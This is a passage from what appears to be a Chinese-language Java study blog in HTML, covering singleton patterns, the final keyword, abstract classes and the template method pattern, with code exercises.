&#125;<br>        <span class="hljs-keyword">return</span> cat;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cat&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="饿汉式和懒汉式的区别"><a href="#饿汉式和懒汉式的区别" class="headerlink" title="饿汉式和懒汉式的区别"></a>饿汉式和懒汉式的区别</h3><ol><li>两者最主要的区别在于创建对象的<strong>时机不同</strong>：饿汉式是在类加载就创建了对象实例，而懒汉式是在使用时才创建。</li><li>饿汉式不存在线程安全问题，<strong>懒汉式存在线程安全问题</strong>。</li><li>饿汉式存在<strong>浪费资源</strong>的问题。如果程序员一个对象实例都没有使用，那么饿汉式创建的对象就浪费了。</li><li>在javaSE标准类中，java.lang.Runtime就是经典的单例模式</li></ol><h2 id="6-final"><a href="#6-final" class="headerlink" title="6.final"></a>6.final</h2><p>final可以修饰类、属性、方法和局部变量。</p><p>在某些情况下会使用到final：</p><ol><li><p>当不希望类被继承时，可以用final修饰</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221016154126410.png" alt="image-20221016154126410" style="zoom:50%;" /></li><li><p>当不希望父类的某个方法被子类覆盖&#x2F;重写时，可以用final关键字修饰</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221016154302252.png" alt="image-20221016154302252" style="zoom:50%;" /></li><li><p>当不希望类的某个属性的值被修改，可以用final修饰</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221016154538557.png" alt="image-20221016154538557" style="zoom:50%;" /></li><li><p>当不希望某个局部变量被修改，可以用final修饰</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221016154749199.png" alt="image-20221016154749199" style="zoom:50%;" /></li></ol><h3 id="注意事项和细节讨论"><a href="#注意事项和细节讨论" class="headerlink" title="注意事项和细节讨论"></a>注意事项和细节讨论</h3><ol><li><p>final修饰的属性又叫常量，一般 用XX_XX_XX来命名</p></li><li><p>final修饰的属性<strong>在定义时</strong>，<strong>必须赋初值</strong>，并且以后不能再修改，赋值可以在如下位置之一【选择一个位置赋初值即可】：</p><ol><li>定义时：如public final double TAX_RATE &#x3D; 0.08;</li><li>在构造器中</li><li>在代码块中</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> <span class="hljs-variable">TAX_RATE</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.08</span>;<span class="hljs-comment">//定义时</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> TAX_RATE2;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> TAX_RATE3;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AA</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//在构造器中</span><br>        TAX_RATE2=<span class="hljs-number">1.1</span>;<br>    &#125;<br>    &#123;<span class="hljs-comment">//在代码块赋值</span><br>        TAX_RATE3=<span class="hljs-number">8.8</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>如果final修饰的属性是静态的，则初始化的位置只能是</p><ol><li>在定义时</li><li>在静态代码块</li></ol><p>不能再构造器中赋值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> <span class="hljs-variable">TAX_RATE</span> <span class="hljs-operator">=</span> <span class="hljs-number">99.9</span>;<span class="hljs-comment">//定义时</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> TAX_RATE2;<br>    <span class="hljs-keyword">static</span>&#123;<span class="hljs-comment">//静态代码块</span><br>        TAX_RATE2 = <span class="hljs-number">3.3</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>final类不能继承，但是可以实例化对象（new）</p></li><li><p>如果类不是final类，但是含有final方法，则该方法虽然不能重写，但是可以被继承</p></li><li><p>一般来说，如果一个类已经是final类了，就没有必要再将方法修饰成final方法</p></li><li><p>final不能修饰构造方法（即构造器）</p></li><li><p>final和static往往搭配使用，效率更高，不会导致类加载，底层编译器做了优化处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalDetail01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(BBB.num);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BBB</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">10000</span>;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;BBB静态代码块被执行&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221016160659378.png" alt="image-20221016160659378" style="zoom:50%;" /></li><li><p>包装类（Integer,Double,Float,Boolean等都是final),String也是final类</p></li></ol><h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><h4 id="题目1-1"><a href="#题目1-1" class="headerlink" title="题目1"></a>题目1</h4><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221016160935275.png" alt="image-20221016160935275" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalExercise01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Circle</span> <span class="hljs-variable">circle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>(<span class="hljs-number">5.0</span>);<br>        System.out.println(circle.calArea());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> radius;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> PI; <span class="hljs-comment">// = 3.14</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Circle</span><span class="hljs-params">(<span class="hljs-type">double</span> radius)</span> &#123;<span class="hljs-comment">//构造器</span><br>        <span class="hljs-built_in">this</span>.radius = radius;<br><span class="hljs-comment">//        PI = 3.14;</span><br>    &#125;<br>    &#123;<br>        PI = <span class="hljs-number">3.14</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calArea</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> PI * radius * radius;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="题目2-1"><a href="#题目2-1" class="headerlink" title="题目2"></a>题目2</h4><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221016161811839.png" alt="image-20221016161811839"></p><p>错误，final常量不能再修改，例如++x。</p><h2 id="7-抽象类"><a href="#7-抽象类" class="headerlink" title="7.抽象类"></a>7.抽象类</h2><p>当父类的某些方法，需要声明，但又不确定如何实现时，可以将其生命为抽象方法，这个类就是抽象类。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Abstract01</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>&#125;<br>&#125;<br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>&#123;<br><span class="hljs-keyword">private</span> String name;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Animal</span><span class="hljs-params">(String name)</span>&#123;<br><span class="hljs-built_in">this</span>.name = name;<br>&#125;<br><span class="hljs-comment">//这里实现了eat，但无意义</span><br><span class="hljs-comment">//即：父类方法不确定性的问题</span><br><span class="hljs-comment">//考虑将给方法设计为抽象（abstract）方法</span><br><span class="hljs-comment">//所谓抽象方法就是没有实现的方法</span><br><span class="hljs-comment">//所谓没有实现就是指，没有方法体</span><br><span class="hljs-comment">//当一个类中存在抽象方法时，需要将该类声明为abstract类</span><br><span class="hljs-comment">//一般来说，抽象类会被继承，由其子类来实现方法。</span><br>  <br><span class="hljs-comment">// public void eat()&#123;</span><br><span class="hljs-comment">// System.out.println(&quot;这是一个动物，但是不知道吃什么..&quot;);</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>当一个类中存在抽象方法时，需要将该类声明为abstract类。</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ol><li><p>用abstract关键字来修饰一个类时，这个类就叫抽象类；abstract关键字来修饰一个方法时，这个方法就叫抽象方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">访问修饰符 <span class="hljs-keyword">abstract</span> 类名&#123;<br>&#125;<br>访问修饰符 <span class="hljs-keyword">abstract</span> 返回类型 方法名(参数列表);<span class="hljs-comment">//无方法体</span><br></code></pre></td></tr></table></figure></li><li><p>抽象类的价值更多用在设计。设计者设计好后，让子类继承并实现抽象类。</p></li><li><p>抽象类是考官比较爱提问的知识点，在框架和设计模式使用较多</p></li></ol><h3 id="注意事项-amp-细节"><a href="#注意事项-amp-细节" class="headerlink" title="注意事项&amp;细节"></a>注意事项&amp;细节</h3><ol><li><p>抽象类不能被实例化（不可以new）</p></li><li><p>抽象类不一定要包含abstract方法，可以包含非abstract方法。</p></li><li><p>一旦包含了abstract方法，这个类必须声明为abstrat</p></li><li><p>abstract只能修饰类和方法</p></li><li><p>抽象类可以有任意成员【<strong>抽象类本质还是类</strong>】</p><p>例如：非抽象方法，构造器，静态属性等。</p></li><li><p>抽象类不能有主题，及不能实现</p><p>例如：abstract void aaa(){}; 是错误的</p></li><li><p>如果一个类继承了抽象类，则它必须实现抽象类的所有抽象方法，除非它自己也声明为abstract类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">E</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-comment">//继承，要么本身也是abstract类</span><br><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">F</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">E</span>&#123;<br>&#125;<br><span class="hljs-comment">//要么实现抽象类的所有抽象方法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">G</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">E</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//这里等于实现了父类E的抽象方法，所谓实现方法，就是有方法体</span><br>&#125;<br>&#125; <br></code></pre></td></tr></table></figure></li><li><p>抽象方法不能使用<strong>private、final</strong>和<strong>static</strong>来修饰。因为这些关键字都是<strong>和重写相违背</strong>的。</p></li></ol><h3 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h3><p>题目1：</p><p>abstract final class A{} 能通过编译吗？ why？</p><p>abstract public static void test2() 能通过编译吗？ why？</p><p>abstract private void test3() 能通过编译吗？ why？</p><p>答：三个都不能，因为final、private、static关键字和abstract相违背。</p><p>题目2：</p><blockquote><p>编写一个Employee类，声明为抽象类，包含如下三个属性：name， id， salary。提供必要的构造器和抽象方法：work()。对于Manager类来说，他既是员工，还具有奖金（bonus）的属性。</p><p>请使用继承的思想，设计CommonEmployee类和Manager类，要求类中提供必要的方法进行属性访问，实现work()，提示“经理&#x2F;普通员工 名字 工作中….”</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span>&#123;<br><span class="hljs-keyword">private</span> String name;<br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> salary;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">work</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> id,<span class="hljs-type">int</span> salary)</span>&#123;<br><span class="hljs-built_in">this</span>.id = id;<br><span class="hljs-built_in">this</span>.name = name;<br><span class="hljs-built_in">this</span>.salary = salary;<br>&#125;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> name;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> id;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">salary</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> salary;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span>&#123;<br><span class="hljs-built_in">this</span>.name = name;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;<br><span class="hljs-built_in">this</span>.id = id;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSalary</span><span class="hljs-params">(<span class="hljs-type">int</span> salary)</span>&#123;<br><span class="hljs-built_in">this</span>.salary = salary;<br>&#125;<br><br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Manage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Employee</span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> bonus;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">work</span><span class="hljs-params">()</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;经理&quot;</span>+getName()+<span class="hljs-string">&quot;工作中...&quot;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Manage</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> id,<span class="hljs-type">int</span> salary)</span>&#123;<br><span class="hljs-built_in">super</span>(name,id,salary); <br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getBouns</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> bonus;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBouns</span><span class="hljs-params">(<span class="hljs-type">int</span> bonus)</span>&#123;<br><span class="hljs-built_in">this</span>.bonus = bonus;<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonEmployee</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Employee</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">CommonEmployee</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> id,<span class="hljs-type">int</span> salary)</span>&#123;<br><span class="hljs-built_in">super</span>(name,id,salary); <br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">work</span><span class="hljs-params">()</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;普通员工&quot;</span>+getName()+<span class="hljs-string">&quot;工作中...&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="模板设计模块"><a href="#模板设计模块" class="headerlink" title="模板设计模块"></a>模板设计模块</h3><p>需求：</p><blockquote><p>1.要有多个类，完成不同的job</p><p>2.要求能够统各自完成任务的时间</p></blockquote><p>返回时间可以使用System类下的一个方法long。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221028160835539.png" alt="image-20221028160835539"></p><p>class AA:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span> &#123;<br>    <span class="hljs-comment">//计算任务</span><br>    <span class="hljs-comment">//1+...+100000</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">job</span><span class="hljs-params">()</span>&#123;<br><br><br>        <span class="hljs-comment">//得到开始的时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-type">long</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">80000</span>; i++) &#123;<br>            num +=i;<br>        &#125;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;AA执行时间:&quot;</span>+(end-start));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>class BB:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">job</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//得到开始的时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-type">long</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">800000</span>; i++) &#123;<br>            num +=i;<br>        &#125;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;BB执行时间:&quot;</span>+(end-start));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>冗余度太高，如果需要计算时间，需要重新添加获取时间的代码。</p><p>把获取时间单独作为一个方法calculateTime。</p><p>new class AA:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">calculateTime</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//得到开始的时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        job();<br>        <span class="hljs-comment">//得到结束的时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;AA执行时间:&quot;</span> + (end - start));<br>    &#125;<br>    <span class="hljs-comment">//计算任务</span><br>    <span class="hljs-comment">//1+...+100000</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">job</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">80000</span>; i++) &#123;<br>            num += i;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但若是还有其他类（CC类、或者DD类）需要计算时间，仍然很麻烦。</p><p>所以可以使用抽象的父类，包含calculateTime方法和抽象的job类。</p><p>所以设计一个抽象类Template，完成以下功能</p><ol><li>编写calculateTime()，可以计算某段代码的耗时时间</li><li>编写抽象方法</li><li>编写一个子类Sub，继承抽象类Template，并实现code方法</li><li>编写一个测试类TestTemplate</li></ol><p>抽象类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Template</span> &#123;<span class="hljs-comment">//抽象类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">job</span><span class="hljs-params">()</span>;<span class="hljs-comment">//抽象方法</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">calculateTime</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//实现方法，调用job</span><br>        <span class="hljs-comment">//得到开始的时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        job();<span class="hljs-comment">//动态绑定机制</span><br>        <span class="hljs-comment">//得到结束的时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;执行时间:&quot;</span> + (end - start));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>子类AA：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Template</span>&#123;<br>    <span class="hljs-comment">//计算任务</span><br>    <span class="hljs-comment">//1+...+100000</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">job</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">80000</span>; i++) &#123;<br>            num += i;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTemplate</span> &#123;<br>    <span class="hljs-keyword">public</span> <span 